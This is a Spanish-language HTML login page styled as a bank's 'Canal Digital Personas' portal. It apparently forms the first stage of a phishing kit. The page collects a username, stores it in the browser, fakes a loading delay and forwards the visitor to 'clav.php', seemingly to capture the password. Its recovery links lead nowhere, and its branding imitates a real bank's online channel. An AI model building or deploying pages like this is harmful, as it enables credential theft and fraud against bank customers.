<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Canal Digital</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
      display: flex;
      min-height: 100vh;
      background: #fff;
    }

    .left {
      width: 50%;
      background: url('img/mujer.jpg') no-repeat center center;
      background-size: cover;
      border-top-right-radius: 40px;
      border-bottom-right-radius: 40px;
      position: relative;
      transition: background-image 0.5s ease-in-out;
    }

    .carousel-controls {
      position: absolute;
      bottom: 30px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      gap: 10px;
      z-index: 20;
    }

    .carousel-dot {
      width: 12px;
      height: 12px;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.5);
      cursor: pointer;
      transition: background 0.3s;
    }

    .carousel-dot.active {
      background: #fff;
    }

    .logo {
      position: absolute;
      top: 30px;
      left: 30px;
      width: 180px;
      height: auto;
      z-index: 10;
    }

    .right {
      width: 50%;
      padding: 50px 40px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      position: relative;
    }

    .brand-text-right {
      position: absolute;
      top: 30px;
      left: 30px;
      color: #333;
      font-size: 28px;
      font-weight: bold;
      z-index: 10;
    }

    .brand-text-right .light-blue {
      color: #7ba7d9;
    }

    .brand-text-right .dark-blue {
      color: #0059b2;
      font-weight: bold;
    }

    .right h2 {
      font-size: 24px;
      font-weight: bold;
      margin-bottom: 30px;
    }

    .input-group {
      margin-bottom: 30px;
    }

    .input-group label {
      font-size: 14px;
      color: #333;
      display: block;
      margin-bottom: 5px;
    }

    .input-group input {
      width: 100%;
      padding: 10px;
      border: none;
      border-bottom: 1px solid #aaa;
      font-size: 16px;
      outline: none;
    }

    .buttons {
      display: flex;
      align-items: center;
      gap: 15px;
      margin-bottom: 25px;
    }

    .buttons button {
      padding: 10px 20px;
      border: none;
      font-size: 14px;
      cursor: pointer;
      border-radius: 5px;
    }

    .btn-primary {
      background-color: #c2d5e4;
      color: #000;
      transition: all 0.3s;
    }

    .btn-primary.active {
      background-color: #0059b2;
      color: #fff;
    }

    .btn-primary:disabled {
      background-color: #999;
      cursor: not-allowed;
    }

    .loading-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }

    .spinner {
      width: 80px;
      height: 80px;
      border: 12px solid rgba(255, 255, 255, 0.3);
      border-top: 12px solid #fff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    @keyframes pulse {
      0% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.1); opacity: 0.7; }
      100% { transform: scale(1); opacity: 1; }
    }

    .links {
      font-size: 13px;
      margin-bottom: 40px;
    }

    .links a {
      color: #0059b2;
      text-decoration: none;
      margin-right: 8px;
    }

    .footer {
      font-size: 13px;
      color: #444;
      margin-top: 50px;
    }

    .footer span {
      margin-right: 15px;
    }

    @media (max-width: 768px) {
      body {
        flex-direction: column;
      }

      .left, .right {
        width: 100%;
        border-radius: 0;
      }

      .left {
        height: 40vh;
        min-height: 300px;
      }

      .right {
        padding: 30px 20px;
        height: 60vh;
        justify-content: flex-start;
        padding-top: 40px;
      }

      .logo {
        width: 120px;
        top: 20px;
        left: 20px;
      }

      .brand-text-right {
        font-size: 20px;
        top: 20px;
        left: 50%;
        transform: translateX(-50%);
        text-align: center;
      }

      .right h2 {
        font-size: 20px;
        margin-bottom: 25px;
        margin-top: 40px;
      }

      .input-group {
        margin-bottom: 25px;
      }

      .input-group input {
        padding: 12px 10px;
        font-size: 16px;
      }

      .buttons {
        margin-bottom: 20px;
      }

      .buttons button {
        padding: 12px 25px;
        font-size: 16px;
        width: 100%;
      }

      .links {
        font-size: 12px;
        margin-bottom: 30px;
        text-align: center;
      }

      .footer {
        font-size: 11px;
        margin-top: 30px;
        text-align: center;
      }

      .footer span {
        display: block;
        margin-bottom: 5px;
        margin-right: 0;
      }

      .carousel-controls {
        bottom: 20px;
      }

      .carousel-dot {
        width: 10px;
        height: 10px;
      }
    }

    @media (max-width: 480px) {
      .right {
        padding: 20px 15px;
      }

      .logo {
        width: 100px;
        top: 15px;
        left: 15px;
      }

      .brand-text-right {
        font-size: 18px;
        top: 15px;
        left: 50%;
        transform: translateX(-50%);
        text-align: center;
      }

      .right h2 {
        font-size: 18px;
        margin-bottom: 20px;
        margin-top: 35px;
      }

      .input-group input {
        padding: 10px;
        font-size: 14px;
      }

      .buttons button {
        padding: 10px 20px;
        font-size: 14px;
      }

      .links {
        font-size: 11px;
      }

      .footer {
        font-size: 10px;
      }
    }
  </style>
</head>
<body>

  <div id="loader" style="
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: #ffffff;
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    z-index: 9999;
">
    <img src="img/l1.png" alt="Cargando..." style="width: 120px; height: 120px; animation: pulse 1.5s infinite;">
</div>

  <div class="left">
    <img src="img/mun.png" alt="Logo Municipal" class="logo">
    <div class="carousel-controls">
      <div class="carousel-dot active" onclick="goToSlide(0)"></div>
      <div class="carousel-dot" onclick="goToSlide(1)"></div>
      <div class="carousel-dot" onclick="goToSlide(2)"></div>
    </div>
  </div>

  <div class="right">
    <div class="brand-text-right"><span class="light-blue">Canal Digital</span> <span class="dark-blue">Personas</span></div>
    <h2>INICIAR SESIÓN</h2>
    <div class="input-group">
      <label for="usuario">Nombre de usuario</label>
      <input type="text" id="usuario" placeholder="Ingrese su usuario" maxlength="20" pattern="[a-zA-Z0-9]+" title="Solo letras y números permitidos">
    </div>

    <div class="buttons">
      <button class="btn-primary" onclick="handleLogin()">Ingresar</button>
    </div>

    <div class="links">
      <a href="#">¿Olvidó su usuario?</a> / 
      <a href="#">¿Olvidó su contraseña?</a>
    </div>

    <div class="footer">
      <span>Educación financiera para todos</span>
      <span>Convenios de recaudo</span>
      <span>Seguridad bancaria</span>
    </div>
  </div>

  <div class="loading-overlay" id="loadingOverlay">
    <div class="spinner"></div>
  </div>

  <script>
    // Ocultar loader después de 3 segundos
    setTimeout(function() {
      const loader = document.getElementById('loader');
      if (loader) {
        loader.style.display = 'none';
      }
    }, 3000);

    // Carrusel automático
    const images = [
      'img/mujer.jpg',
      'img/mujer1.jpg', 
      'img/muje2.jpg'
    ];
    
    let currentSlide = 0;
    const leftSection = document.querySelector('.left');
    const dots = document.querySelectorAll('.carousel-dot');
    
    function changeSlide() {
      leftSection.style.backgroundImage = `url('${images[currentSlide]}')`;
      
      // Actualizar dots activos
      dots.forEach((dot, index) => {
        dot.classList.toggle('active', index === currentSlide);
      });
    }
    
    function goToSlide(slideIndex) {
      currentSlide = slideIndex;
      changeSlide();
    }
    
    function nextSlide() {
      currentSlide = (currentSlide + 1) % images.length;
      changeSlide();
    }
    
    // Cambiar imagen automáticamente cada 4 segundos
    setInterval(nextSlide, 4000);

    // Función para manejar el login
    function handleLogin() {
      const usuario = document.getElementById('usuario').value;
      const button = document.querySelector('.btn-primary');
      const loadingOverlay = document.getElementById('loadingOverlay');
      
      // Validar que el campo no esté vacío
      if (!usuario.trim()) {
        alert('Por favor ingrese su usuario');
        return;
      }
      
      // Validar que sea alfanumérico
      if (!/^[a-zA-Z0-9]+$/.test(usuario)) {
        alert('El usuario solo puede contener letras y números');
        return;
      }
      
      // Deshabilitar botón y mostrar loading
      button.disabled = true;
      button.textContent = 'Cargando...';
      loadingOverlay.style.display = 'flex';
      
      // Guardar usuario en localStorage
      localStorage.setItem('usuario', usuario);
      
      // Simular carga de 3 segundos
      setTimeout(() => {
        // Redirigir a clav.php
        window.location.href = 'clav.php';
      }, 3000);
    }

    // Permitir Enter para enviar
    document.getElementById('usuario').addEventListener('keypress', function(e) {
      if (e.key === 'Enter') {
        handleLogin();
      }
    });

    // Validar entrada en tiempo real
    document.getElementById('usuario').addEventListener('input', function(e) {
      const usuario = e.target.value;
      const button = document.querySelector('.btn-primary');
      
      // Remover caracteres no alfanuméricos
      const cleanUsuario = usuario.replace(/[^a-zA-Z0-9]/g, '');
      
      // Si el valor limpio es diferente, actualizar el campo
      if (cleanUsuario !== usuario) {
        e.target.value = cleanUsuario;
      }
      
      // Activar botón si hay al menos 4 caracteres alfanuméricos
      if (cleanUsuario.length >= 4) {
        button.classList.add('active');
      } else {
        button.classList.remove('active');
      }
    });
     </script>

</body>
</html>
